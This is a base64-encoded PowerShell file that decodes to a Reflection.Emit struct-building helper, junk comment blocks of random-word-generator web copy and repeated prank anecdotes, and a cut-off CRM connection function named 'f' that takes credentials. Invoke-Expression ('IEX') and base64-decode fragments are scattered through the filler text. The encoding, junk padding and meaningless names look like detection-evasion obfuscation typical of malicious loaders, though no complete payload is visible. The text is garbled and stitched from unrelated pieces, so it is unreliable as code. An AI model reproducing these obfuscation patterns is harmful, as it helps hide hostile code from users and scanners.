WYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0hhc2h0YWJsZV0KICAgICAgICAkU3RydWN0RmllbGRzLAoKICAgICAgICBbUmVmbGVjdGlvbi5FbWl0LlBhY2tpbmdTaXplXQogICAgICAgICRQYWNraW5nU2l6ZSA9IFtSZWZsZWN0aW9uLkVtaXQuUGFja2luZ1NpemVdOjpVbnNwZWNpZmllZCwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkRXhwbGljaXRMYXlvdXQKICAgICkKCiAgICBpZiAoJE1vZHVsZSAtaXMgW1JlZmxlY3Rpb24uQXNzZW1ibHldKQogICAgewogICAgICAgIHJldHVybiAoJE1vZHVsZS5HZXRUeXBlKCRGdWxsTmFtZSkpCiAgICB9CgogICAgW1JlZmxlY3Rpb24uVHlwZUF0dHJpYnV0ZXNdICRTdHJ1Y3RBdHRyaWJ1dGVzID0gJ0Fuc2lDbGFzcywKICAgICAgICBDbGFzcywKICAgICAgICBQdWJsaWMsCiAgICAgICAgU2VhbGVkLAogICAgICAgIElFWEZpZWxkSW5pdCcKCiAgICBpZiAoJEV4cGxpY2l0TGF5b3V0KQogICAgewogICAgICAgICRTdHJ1Y3RBdHRyaWJ1dGVzID0gJFN0cnVjdEF0dHJpYnV0ZXMgLWJvciBbUmVmbGVjdGlvbi5UeXBlQXR0cmlidXRlc106OkV4cGxpY2l0TGF5b3V0CiAgICB9CiAgICBlbHNlCiAgICB7CiAgICAgICAgJFN0cnVjdEF0dHJpYnV0ZXMgPSAkU3RydWN0QXR0cmlidXRlcyAtYm9yIFtSZWZsZWN0aW9uLlR5cGVBdHRyaWJ1dGVzXTo6U2VxdWVudGlhbExheW91dAogICAgfQoKICAgICRTdHJ1Y3RCdWlsZGVyID0gJE1vZHVsZS5EZWZpbmVUeXBlKCRGdWxsTmFtZSwgJFN0cnVjdEF0dHJpYnV0ZXMsIFtWYWx1ZVR5cGVdLCAkUGFja2luZ1NpemUpCiAgICAkQ29uc3RydWN0b3JJbmZvID0gW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxBc0F0dHJpYnV0ZV0uR2V0Q29uc3RydWN0b3JzKClbMF0KICAgICRTaXplQ29uc3QgPSBAKFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsQXNBdHRyaWJ1dGVdLkdldEZpZWxkKCdTaXplQ29uc3QnKSkKCiAgICAkRmllbGRzID0gTmV3LU9iamVjdCBIYXNodGFibGVbXSgkU3RydWN0RmllbGRzLkNvdW50KQoKICAgICMgU29ydCBlYWNoIGZpZWxkIGFjY29yZGluZyB0byB0aGUgb3JkZXJzIHNwZWNpZmllZAogICAgIyBVbmZvcnR1bmF0ZWx5LCBQU3YyIGRvZXNuJ3QgaGF2ZSB0aGUgbHV4dXJ5IG9mIHRoZQogICAgIyBoYXNodGFibGUgW09yZGVyZWRdIGFjY2VsZXJhdG9yLgogICAgZm9yZWFjaCAoJEZpZWxkIGluICRTdHJ1Y3RGaWVsZHMuS2V5cykKICAgIHsKICAgICAgICAkSW5kZXggPSAkU3RydWN0RmllbGRzWyRGaWVsZF1bJ1Bvc2l0aW9uJ10KICAgICAgICAkRmllbGRzWyRJbmRleF0gPSBAe0ZpZWxkTmFtZSA9ICRGaWVsZDsgUHJvcGVydGllcyA9ICRTdHJ1Y3RGaWVsZHNbJEZpZWxkXX0KICAgIH0KCiAgICBmb3JlYWNoICgkRmllbGQgaW4gJEZpZWxkcykKICAgIHsKICAgICAgICAkRmllbGROYW1lID0gJEZpZWxkWydGaWVsZE5hbWUnXQogICAgICAgICRGaWVsZFByb3AgPSAkRmllbGRbJ1Byb3BlcnRpZXMnXQoKICAgICAgICAkT2Zmc2V0ID0gJEZpZWxkUHJvcFsnT2Zmc2V0J10KICAgICAgICAkVHlwZSA9ICRGaWVsZFByb3BbJ1R5cGUnXQogICAgICAgICRNYXJzaGFsQXMgPSAkRmllbGRQcm9wWydNYXJzaGFsQXMnXQoKICAgICAgICAkTmV3RmllbGQgPSAkU3RydWN0QnVpbGRlci5EZWZpbmVGaWVsZCgkRmllbGROYW1lLCAkVHlwZSwgJ1B1YmxpYycpCgogICAgICAgIGlmICgkTWFyc2hhbEFzKQogICAgICAgIHsKICAgICAgICAgICAgJFVubWFuYWdlZFR5cGUgPSAkTWFyc2hhbEFzWzBdIC1hcyAoW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLlVubWFuYWdlZFR5cGVdKQogICAgICAgICAgICBpZiAoJE1hcnNoYWxBc1sxXSkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJFNpemUgPSAkTWFyc2hhbEFzWzFdCiAgICAgICAgICAgICAgICAkQXR0cmliQnVpbGRlciA9IE5ldy1PYmplY3QgUmVmbGVjdGlvbi5FbWl0LkN1c3RvbUF0dHJpYnV0ZUJ1aWxkZXIoJENvbnN0cnVjdG9ySW5mbywKICAgICAgICAgICAgICAgICAgICAkVW5tYW5hZ2VkVHlwZSwgJFNpemVDb25zdCwgQCgkU2l6ZSkpCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkQXR0cmliQnVpbGRlciA9IE5ldy1PYmplY3QgUmVmbGVjdGlvbi5FbWl0LkN1c3RvbUF0dHJpYnV0ZUJ1aWxkZXIoJENvbnN0cnVjdG9ySW5mbywgW09iamVjdFtdXSBAKCRVbm1hbmFnZWRUeXBlKSkKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJE5ld0ZpZWxkLlNldEN1c3RvbUF0dHJpYnV0ZSgkQXR0cmliQnVpbGRlcikKICAgICAgICB9CgogICAgICAgIGlmICgkRXhwbGljaXRMYXlvdXQpIHsgJE5ld0ZpZWxkLlNldE9mZnNldCgkT2Zmc2V0KSB9CiAgICB9CgogICAgIyBNYWtlIHRoZSBzdHJ1Y3QgYXdhcmUgb2YgaXRzIG93biBzaXplLgogICAgIyBObyBtb3JlIGhhdmluZyB0byBjYWxsIFtSdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mIQogICAgJFNpemVNZXRob2QgPSAkU3RydWN0QnVpbGRlci5EZWZpbmVNZXRob2QoJ0dldFNpemUnLAogICAgICAgICdQdWJsaWMsIFN0YXRpYycsCiAgICAgICAgW0ludF0sCiAgICAgICAgW1R5cGVbXV0gQCgpKQogICAgJElMR2VuZXJhdG9yID0gJFNpemVNZXRob2QuR2V0SUxHZW5lcmF0b3IoKQogICAgIyBUaGFua3MgZm9yIHRoZSBoZWxwLCBKYXNvbiBTaGlyayEKICAgICRJTEdlbmVyYXRvci5FbWl0KFtSZWZsZWN0aW9uLkVtaXQuT3BDb2Rlc106OkxkdG9rZW4sICRTdHJ1Y3RCdWlsZGVyKQogICAgJElMR2VuZXJhdG9yLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6Q2FsbCwKICAgICAgICBbVHlwZV0uR2V0TWV0aG9kKCdHZXRUeXBlRnJvbUhhbmRsZScpKQogICAgJElMR2VuZXJhdG9yLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6Q2FsbCwKICAgICAgICBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF0uR2V0TWV0aG9kKCdTaXplT2YnLCBbVHlwZVtdXSBAKFtUeXBlXSkpKQogICAgJElMR2VuZXJhdG9yLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6UmV0KQoKICAgICMgQWxsb3cgZm9yIGV4cGxpY2l0IGNhc3RpbmcgZnJvbSBhbiBJbnRQdHIKICAgICMgTm8gbW9yZSBoYXZpbmcgdG8gY2FsbCBbUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlIQogICAgJEltcGxpY2l0Q29udmVydGVyID0gJFN0cnVjdEJ1aWxkZXIuRGVmaW5lTWV0aG9kKCdvcF9JbXBsaWNpdCcsCiAgICAgICAgJ1ByaXZhdGVTY29wZSwgUHVibGljLCBTdGF0aWMsIEhpZGVCeVNpZywgU3BlY2lhbE5hbWUnLAogICAgICAgICRTdHJ1Y3RCdWlsZGVyLAogICAgICAgIFtUeXBlW11dIEAoW0ludFB0cl0pKQogICAgJElMR2VuZXJhdG9yMiA9ICRJbXBsaWNpdENvbnZlcnRlci5HZXRJTEdlbmVyYXRvcigpCiAgICAkSUxHZW5lcmF0b3IyLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6Tm9wKQogICAgJElMR2VuZXJhdG9yMi5FbWl0KFtSZWZsZWN0aW9uLkVtaXQuT3BDb2Rlc106OkxkYXJnXzApCiAgICAkSUxHZW5lcmF0b3IyLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6TGR0b2tlbiwgJFN0cnVjdEJ1aWxkZXIpCiAgICAkSUxHZW5lcmF0b3IyLkVtaXQoW1JlZmxlY3Rpb24uRW1pdC5PcENvZGVzXTo6Q2FsbCwKICAgICAgICBbVHlwZV0uR2V0TWV0aG9kKCdHZXRUeXBlRnJvbUhhbmRsZScpKQogICAgJElMR2VuZXJhdG9yMi5FbWl0KFtSZWZsZWN0aW9uLkVtaXQuT3BDb2Rlc106OkNhbGwsCiAgICAgICAgW1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdLkdldE1ldGhvZCgnUHRyVG9TdHJ1Y3R1cmUnLCBbVHlwZVtdXSBAKFtJbnRQdHJdLCBbVHlwZV0pKSkKICAgICRJTEdlbmVyYXRvcjIuRW1pdChbUmVmbGVjdGlvbi5FbWl0Lk9wQ29kZXNdOjpVbmJveF9BbnksICRTdHJ1Y3RCdWlsZGVyKQogICAgJElMR2VuZXJhdG9yMi5FbWl0KFtSZWZsZWN0aW9uLkVtaXQuT3BDb2Rlc106OlJldCkKCiAgICAkU3RydWN0QnVpbGRlci5DcmVhdGVUeXBlKCkKfQo8Iz4+ClNwPWVsbGluZyBhbmQgVm9jYWJ1bGFyeQpUaGlzIHRvb2wgY2FuIGJlIGFuIGV4Y2VsbGVudCB3YXkgdG8gaW1wcm92ZSB2b2NhYnVsYXJ5IG9yIHByYWN0aWNlIGZvciByKCkgYmVlcy4gSWYgYW4gcSgpIHdvcmQgbygpLCBwKCkgdXAgdGhlIG1lYW5pbmcgd2lsbCBoZWxwIHN0dWRlbnRzIGluY3JlYXNlIHRoZSBudW1iZXIgb2Ygd29yZHMgdGhleSBrbm93LiBXb3JraW5nIHdpdGggYSBwYXJ0bmVyLCBzdHVkZW50cyBjYW4gdGVzdCBlYWNoIG90aGVyIG9uIHRoZSByKCkgZm9yIHRoZSByYW5kb21pemVkIHdvcmRzIG0oKWQuCgpOYW1lIEluc3BpcmF0aW9uCklmIHlvdSBuZWVkIHRvIGNyZWF0ZSBhIG5hbWUgZm9yIGEgcHJvZHVjdCwgYW4gZXZlbnQsIGEgYmFuZCBvciBmb3IgYW55dGhpbmcgZWxzZSwgdGhpcyB0b29sIGNhbiBiZSBxdWl0ZSBoZWxwZnVsLiBBcyB5b3UgY29uc2lkZXIgbmFtZXMsIG0oKSBhIG51bWJlciBvZiByYW5kb20gd29yZHMgYW5kIHNlZSBob3cgdGhleSBpbXBhY3Qgd2hhdCB5b3UgaGF2ZSBhbHJlYWR5IGNvbWUgdXAgd2l0aC4gSW5wdXR0aW5nIHVuaXF1ZSB3b3JkcyB5b3UgbWF5IG5vdCBoYXZlIGNvbnNpZGVyZWQgY2FuIHNwYXJrIGFkZGl0aW9uYWwgY3JlYXRpdml0eSB0byBldmVudHVhbGx5IGhlbHAgeW91IHByb2R1Y2UgdGhlIHBlcmZlY3QgbmFtZSBmb3IgeW91ciBwcm9qZWN0LiBJZiB5b3UncmUgcCgpIGZvciBnb29kIGNoYXJhY3RlciBuYW1lcyBvciBiYWJ5IG5hbWVzLCB5b3UgbWlnaHQgYmUgaW50ZXJlc3RlZCBpbiBvdXIgcmFuZG9tIG5hbWUgZ2VuZXJhdG9yLgoKVGhlIGFib3ZlIGxpc3QgaXMgbm90IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoLiBUaGVyZSBhcmUgbGl0ZXJhbGx5IFtTeXN0ZW0uVGV4dC5FbmNvZGluZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoIG9mIHdheXMgdGhlIFJhbmRvbSBXb3JkIEdlbmVyYXRvciBjYW4gYmUgdXNlZC4gUGxlYXNlIGZlZWwgZnJlZSB0byBzaGFyZSB0aGUgd2F5IHlvdSB1c2UgdGhpcyB0b29sLCBhbmQgd2UgYWx3YXlzIHdlbGNvbWUgc3VnZ2VzdGlvbnMgb24gaG93IHdlIGNhbiBpbXByb3ZlIGl0IHRvIHNlcnZlIHlvdSBiZXR0ZXIuIFdlIGFyZSBhbHNvIGludGVyZXN0ZWQgaW4gbmV3IHdvcmQgZ2VuZXJhdG9ycyB5b3UnZCBiZSBpbnRlcmVzdGVkIGluIHVzIGNyZWF0aW5nLiBNYW55IG9mIHRoZSB0b29scyBvbiB0aGlzIHdlYnNpdGUgY2FtZSBmcm9tIGlkZWFzIGZyb20gcGVvcGxlIGxpa2UgeW91IHdobyBjb250YWN0ZWQgdXMuIFBsZWFzZSB0YWtlIHRoZSB0aW1lIHRvIGV4cGxvcmUgdGhlIG90aGVyIHJhbmRvbSBnZW5lcmF0b3JzIHdlIGhhdmUgYXZhaWwKCiM+PCM+4oCcVGhpcyBvbmUgdGltZSBpbiA5dGggZ3JhZGUsIG15IGZyaWVuZCBhbmQgSSBkZWNpZGVkIHRvIHVzZSB0aGUgYigpIElFWCBhIGJpZyB0ZXN0LiBJIGRpZG50IGdpdmUgYSBzaHQgYWJvdXQgdGhpcyB0ZXN0LCBzbyBJIHBsYXlmdWxseSBwcmV0ZW5kZWQgdG8gZ2V0IHJlYWxseSB1cHNldC4gSW4gYXR0ZW1wdCB0byBiZSBvYnZpb3VzbHkgbm90IG1hZCwgSSBraWNrIGEgcGlwZSBvbiB0aGUgdG9wIG9mIGEgdXJpbmFsLCBhY2NpZGVudGFsbHkga25vY2tpbmcgaXQgb3V0IG9mIHRoZSB0b3Agb2YgdGhlIHRvaWxldC4gSXQgd2FzIHN0aWxsIGNvbm5lY3RlZCB0byB0aGUgd2FsbCBob3dldmVyLiBUdXJucyBvdXQsIEkgY291bGQgYWltIHRoZSBwaXBlIGluIGRpZmZlcmVudCBkaXJlY3Rpb25zLiBTbywgSSBhaW1lZCBpdCBzdHJhaWdodCBvdXQgYW5kIHRyaWVkIGZsdXNoaW5nIHRoZSB0b2lsZXQuIFRoZSB3YXRlciBMQVVOQ0hFRCBPVVQgT0YgVEhFIFBJUEUgQU5EIEhJVCBUSEUgV0FMTCBPTiBUSEUgT1RIRVIgU0lERSBPRiBUSEUgUk9PTS4gTXkgZnJpZW5kIGFuZCBJIHdlcmUgZmxpcHBpbmcgb3V0LiBUaGlzIGdhdmUgbWUgYSBicmlnaHQgaWRlYS4gSSBwdXQgdGhlIHBpcGUgaW4gc3VjaCBhIHNwb3Qgd2hlcmUgaXQgbG9va2VkIGxpa2UgaXQgd2FzIHByaW9yIHRvIHVzIGtpY2tpbmcgdGhlIGYqayBvdXQgb2YgaXQuIEhvd2V2ZXIsIEkgcHVsbGVkIGl0IG91dCBldmVyIHNvIHNsaWdodGx5IHNvIHdhdGVyIHdvdWxkIHNwcmF5IG91ciBuZXh0IHVuc3VzcGVjdGluZyB2aWN0aW0uIEkgcmVtZW1iZXIga2lkcyBjb21pbmcgb3V0IG9mIHRoZSBiYXRocm9vbSBkcmVuY2hlZCBpbiB3YXRlciwgY3Vzc2luZyB0aGVpciBicmFpbnMgb3V0IGJlY2F1c2UgdGhleSB3ZXJlIHNvIG1hZC4gR29vZCB0aW1lcy7igJ0jPgo8Iz7igJxUaGlzIG9uZSB0aW1lIGluIDl0aCBncmFkZSwgbXkgZnJpZW5kIGFuZCBJIGRlY2lkZWQgdG8gdXNlIHRoZSBiKCkgSUVYIGEgYmlnIHRlc3QuIEkgZGlkbnQgZ2l2ZSBhIHNodCBhYm91dCB0aGlzIHRlc3QsIHNvIEkgcGxheWZ1bGx5IHByZXRlbmRlZCB0byBnZXQgcmVhbGx5IHVwc2V0LiBJbiBhdHRlbXB0IHRvIGJlIG9idmlvdXNseSBub3QgbWFkLCBJIGtpY2sgYSBwaXBlIG9uIHRoZSB0b3Agb2YgYSB1cmluYWwsIGFjY2lkZW50YWxseSBrbm9ja2luZyBpdCBvdXQgb2YgdGhlIHRvcCBvZiB0aGUgdG9pbGV0LiBJdCB3YXMgc3RpbGwgY29ubmVjdGVkIHRvIHRoZSB3YWxsIGhvd2V2ZXIuIFR1cm5zIG91dCwgSSBjb3VsZCBhaW0gdGhlIHBpcGUgaW4gZGlmZmVyZW50IGRpcmVjdGlvbnMuIFNvLCBJIGFpbWVkIGl0IHN0cmFpZ2h0IG91dCBhbmQgdHJpZWQgZmx1c2hpbmcgdGhlIHRvaWxldC4gVGhlIHdhdGVyIExBVU5DSEVEIE9VVCBPRiBUSEUgUElQRSBBTkQgSElUIFRIRSBXQUxMIE9OIFRIRSBPVEhFUiBTSURFIE9GIFRIRSBST09NLiBNeSBmcmllbmQgYW5kIEkgd2VyZSBmbGlwcGluZyBvdXQuIFRoaXMgZ2F2ZSBtZSBhIGJyaWdodCBpZGVhLiBJIHB1dCB0aGUgcGlwZSBpbiBzdWNoIGEgc3BvdCB3aGVyZSBpdCBsb29rZWQgbGlrZSBpdCB3YXMgcHJpb3IgdG8gdXMga2lja2luZyB0aGUgZiprIG91dCBvZiBpdC4gSG93ZXZlciwgSSBwdWxsZWQgaXQgb3V0IGV2ZXIgc28gc2xpZ2h0bHkgc28gd2F0ZXIgd291bGQgc3ByYXkgb3VyIG5leHQgdW5zdXNwZWN0aW5nIHZpY3RpbS4gSSByZW1lbWJlciBraWRzIGNvbWluZyBvdXQgb2YgdGhlIGJhdGhyb29tIGRyZW5jaGVkIGluIHdhdGVyLCBjdXNzaW5nIHRoZWlyIGJyYWlucyBvdXQgYmVjYXVzZSB0aGV5IHdlcmUgc28gbWFkLiBHb29kIHRpbWVzLuKAnSM+CjwjPuKAnEkgd2FzIGF0IGEgc3dhbmsgYmFyIGZvciBhIHdvcmsgW1N5c3RlbS5UZXh0LkVuY29kaW5nXTo6VVRGOC5HZXRTdHJpbmcoW1N5c3RlbS5Db252ZXJ0XTo6RnJvbUJhc2U2NFN0cmluZygsIGUoKSBzb21lIGdyYWQgc3R1ZGVudHMgd2UgaigpIGZvciBhbiBoKCkgcHJvZ3JhbS4gQWZ0ZXIgd2UgaGFkIGFsbCBoYWQgaygpIGRyaW5rcywgb25lIG9mIHRoZSBzdHVkZW50cyBzYWlkIHRoZXkgZG9udCBsaWtlIHNtb2tlcyBiZWNhdXNlIHRoZXkgdGFzdGUgbGlrZSBhLiBNeSBib3NzIHJlcGxpZWQsIG1heWJlIHlvdSBoYXZlbnQgaGFkIGdvb2Qgc21va2VzLiBTbyBJIGN1dCBpbiwgbWF5YmUgeW91IGhhdmVudCBoYWQgZ29vZCBhLiBJIHdhcyBhc2tlZCB0byBsZWF2ZS7igJ1Tb3VyY2UjPgo8I1RoYXRzIGcoKSBPbmUgdGltZSBJIGF0ZSAyNiBjaG9jb2xhdGUgY2hpcCBpKCkgYmVjYXVzZSBJIHdhcyBtYWQgYXQgbXkgbGl0dGxlIGwoKSBhbmQgZGlkbnQgd2FudCBoZXIgdG8gaGF2ZSBhbnkuIEkgcHVrZWQgYWxsIG92ZXIgdGhlIHBsYWNlLuKAnSBTb3VyY2UjPgo8I+KAnFRoaXMgb25lIHRpbWUgaW4gOXRoIGdyYWRlLCBteSBmcmllbmQgYW5kIEkgZGVjaWRlZCB0byB1c2UgdGhlIGIoKSBJRVggYSBiaWcgdGVzdC4gSSBkaWRudCBnaXZlIGEgc2h0IGFib3V0IHRoaXMgdGVzdCwgc28gSSBwbGF5ZnVsbHkgcHJldGVuZGVkIHRvIGdldCByZWFsbHkgdXBzZXQuIEluIGF0dGVtcHQgdG8gYmUgb2J2aW91c2x5IG5vdCBtYWQsIEkga2ljayBhIHBpcGUgb24gdGhlIHRvcCBvZiBhIHVyaW5hbCwgYWNjaWRlbnRhbGx5IGtub2NraW5nIGl0IG91dCBvZiB0aGUgdG9wIG9mIHRoZSB0b2lsZXQuIEl0IHdhcyBzdGlsbCBjb25uZWN0ZWQgdG8gdGhlIHdhbGwgaG93ZXZlci4gVHVybnMgb3V0LCBJIGNvdWxkIGFpbSB0aGUgcGlwZSBpbiBkaWZmZXJlbnQgZGlyZWN0aW9ucy4gU28sIEkgYWltZWQgaXQgc3RyYWlnaHQgb3V0IGFuZCB0cmllZCBmbHVzaGluZyB0aGUgdG9pbGV0LiBUaGUgd2F0ZXIgTEFVTkNIRUQgT1VUIE9GIFRIRSBQSVBFIEFORCBISVQgVEhFIFdBTEwgT04gVEhFIE9USEVSIFNJREUgT0YgVEhFIFJPT00uIE15IGZyaWVuZCBhbmQgSSB3ZXJlIGZsaXBwaW5nIG91dC4gVGhpcyBnYXZlIG1lIGEgYnJpZ2h0IGlkZWEuIEkgcHV0IHRoZSBwaXBlIGluIHN1Y2ggYSBzcG90IHdoZXJlIGl0IGxvb2tlZCBsaWtlIGl0IHdhcyBwcmlvciB0byB1cyBraWNraW5nIHRoZSBmKmsgb3V0IG9mIGl0LiBIb3dldmVyLCBJIHB1bGxlZCBpdCBvdXQgZXZlciBzbyBzbGlnaHRseSBzbyB3YXRlciB3b3VsZCBzcHJheSBvdXIgbmV4dCB1bnN1c3BlY3RpbmcgdmljdGltLiBJIHJlbWVtYmVyIGtpZHMgY29taW5nIG91dCBvZiB0aGUgYmF0aHJvb20gZHJlbmNoZWQgaW4gd2F0ZXIsIGN1c3NpbmcgdGhlaXIgYnJhaW5zIG91dCBiZWNhdXNlIHRoZXkgd2VyZSBzbyBtYWQuIEdvb2QgdGltZXMu4oCdIz4KZnVuY3Rpb24gZnsKICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQQVJBTSgKICAgICAgICBbcGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UsIFBhcmFtZXRlclNldE5hbWU9IlNlcnZlclVybCIpXQogICAgICAgIFtQU0NyZWRlbnRpYWxdJENyZWRlbnRpYWwsIAoJCVtQYXJhbWV0ZXIoTWFuZGF0b3J5PSR0cnVlLCBQYXJhbWV0ZXJTZXROYW1lPSJTZXJ2ZXJVcmwiKV0KICAgICAgICBbVmFsaWRhdGVQYXR0ZXJuKCdodHRwKHMpPzovL1tcdy1dKygvW1x3LSAuLz8lJj1dKik/JyldCiAgICAgICAgW1VyaV0kU2VydmVyVXJsLAogICAgICAgIFtQYXJhbWV0ZXIoTWFuZGF0b3J5PSRmYWxzZSwgUGFyYW1ldGVyU2V0TmFtZT0iU2VydmVyVXJsIildCiAgICAgICAgW3N0cmluZ10kT3JnYW5pemF0aW9uTmFtZSwKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UsIFBhcmFtZXRlclNldE5hbWU9IlNlcnZlclVybCIpXQogICAgICAgIFtzdHJpbmddJEhvbWVSZWFsbVVybCwKICAgICAgICBbUGFyYW1ldGVyKE1hbmRhdG9yeT0kZmFsc2UsIFBhcmFtZXRlclNldE5hbWU9IkludGVyYWN0aXZlTW9kZSIpXQogICAgICAgIFtzd2l0Y2hdJEludGVyYWN0aXZlTW9kZQogICAgKQogICAgQWRkVGxzMTJTdXBwb3J0ICNtYWtlIHN1cmUgdGxzMTIgaXMgZW5hYmxlZCAKICAgIGlmICgkUFNDbWRsZXQuTXlJbnZvY2F0aW9uLkJvdW5kUGFyYW1ldGVyc1siVmVyYm9zZSJdLklzUHJlc2VudCAtZXEgJHRydWUpIHsKICAgICAgICBFbmFibGUtQ3JtQ29ubmVjdG9yVmVyYm9zZUxvZ2dpbmcKICAgIH0KICAgIGlmKCRJbnRlcmFjdGl2ZU1vZGUpCiAgICB7CiAgICAgICAgJGdsb2JhbDpjb25uID0gR2V0LUNybUNvbm5lY3Rpb24gLUludGVyYWN0aXZlTW9kZSAtVmVyYm9zZQogICAgICAgIFdyaXRlLVZlcmJvc2UgIllvdSBhcmUgbm93IGNvbm5lY3RlZCBhbmQgbWF5IHJ1biBhbnkgb2YgdGhlIENSTSBDb21tYW5kcy4iCiAgICAgICAgCiAgICAgICAgQXBwbHlDcm1TZXJ2aWNlQ2xpZW50T2JqZWN0VGVtcGxhdGUoJGdsb2JhbDpjb25uKSAgI2FwcGx5T2JqZWN0VGVtcGxhdGVGb3JtYXQKCiAgICAgICAgcmV0dXJuICRnbG9iYWw6Y29ubiAKICAgIH0KICAgIGVsc2UKICAgIHsKICAgICAgICBpZigkQ3JlZGVudGlhbCAtZXEgJG51bGwgLUFuZCAhJEludGVyYWN0aXZlKQogICAgICAgIHsKICAgICAgICAgICAgJENyZWRlbnRpYWwgPSBHZXQtQ3JlZGVudGlhbAogICAgICAgIH0KCiAgICAgICAgIyBJZiBPcmdhbml6YXRpb24gTmFtZSBpcyBwYXNlZCwgdXNlIGl0LCBvdGhlcndpc2UgcmV0cmlldmUgYWxsIG9yZ2FuaXphdGlvbnMgdGhlIHVzZXIgYmVsb25ncyB0by4KICAgICAgICBpZigkT3JnYW5pemF0aW9uTmFtZSAtbmUgJycpCiAgICAgICAgewogICAgICAgICAgICAkb3JnYW5pemF0aW9uTmFtZSA9ICRPcmdhbml6YXRpb25OYW1lCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CgkJICAgICRjcm1Pcmdhbml6YXRpb25zID0gR2V0LUNybU9yZ2FuaXphdGlvbnMgLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwgLVNlcnZlclVybCAkU2VydmVyVXJsIC1WZXJib3NlIAogICAgICAgIAogICAgICAgICAgICBpZigkY3JtT3JnYW5pemF0aW9ucy5Db3VudCAtZ3QgMCkKICAgICAgICAgICAgeyAgICAKCQkgICAgCWlmKCRjcm1Pcmdhbml6YXRpb25zLkNvdW50IC1lcSAxKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRvcmdOdW1iZXIgPSAwCiAgICAgICAgICAgICAgICB9CgkJICAgIAllbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJGkgPSAwCgkJICAgIAkJJGNybU9yZ2FuaXphdGlvbnMgPSAkY3JtT3JnYW5pemF0aW9ucyB8IHNvcnQtb2JqZWN0IEZyaWVuZGx5TmFtZQogICAgICAgICAgICAgICAgICAgIGZvcmVhY2goJGNybU9yZ2FuaXphdGlvbiBpbiAkY3JtT3JnYW5pemF0aW9ucykKICAgICAgICAgICAgICAgICAgICB7ICAgCgkJICAgIAkJCSRmcmllbmRseU5hbWUgPSAkY3JtT3JnYW5pemF0aW9uLkZyaWVuZGx5TmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkbWVzc2FnZSA9ICJbJGldICRmcmllbmRseU5hbWUgKCIgKyAkY3JtT3JnYW5pemF0aW9uLldlYkFwcGxpY2F0aW9uVXJsICsgIikiCiAgICAgICAgICAgICAgICAgICAgICAgIFdyaXRlLUhvc3QgJG1lc3NhZ2UgCiAgICAgICAgICAgICAgICAgICAgICAgICRpKysKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgJG9yZ051bWJlciA9IFJlYWQtSG9zdCAiYG5TZWxlY3QgQ1JNIE9yZ2FuaXphdGlvbiBieSBpbmRleCBudW1iZXIiICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCgkJICAgIAl9ICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICMgU3RvcmUgdGhlIE9yZ2FuaXphdGlvbk5hbWUKICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgKCRjcm1Pcmdhbml6YXRpb25zWyRvcmdOdW1iZXJdKS5VbmlxdWVOYW1lICAgIAogICAgICAgICAgICAgICAgJG9yZ2FuaXphdGlvbk5hbWUgPSAoJGNybU9yZ2FuaXphdGlvbnNbJG9yZ051bWJlcl0pLlVuaXF1ZU5hbWUKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIlVzZXIgYmVsb25ncyB0byBubyBvcmdhbml6YXRpb24uIgogICAgICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgICAgIH0KICAgICAgICB9ICAgICAgICAgIAoKICAgICAgICBpZigkSG9tZVJlYWxtVXJsIC1lcSAnJykKICAgICAgICB7CiAgICAgICAgICAgICRnbG9iYWw6Y29ubiA9IEdldC1Dcm1Db25uZWN0aW9uIC1DcmVkZW50aWFsICRDcmVkZW50aWFsIC1TZXJ2ZXJVcmwgJFNlcnZlclVybCAtT3JnYW5pemF0aW9uTmFtZSAkb3JnYW5pemF0aW9uTmFtZSAtVmVyYm9zZQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICAkZ2xvYmFsOmNvbm4gPSBHZXQtQ3JtQ29ubmVjdGlvbiAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbCAtU2VydmVyVXJsICRTZXJ2ZXJVcmwgLU9yZ2FuaXphdGlvbk5hbWUgJG9yZ2FuaXphdGlvbk5hbWUgLUhvbWVSZWFsbVV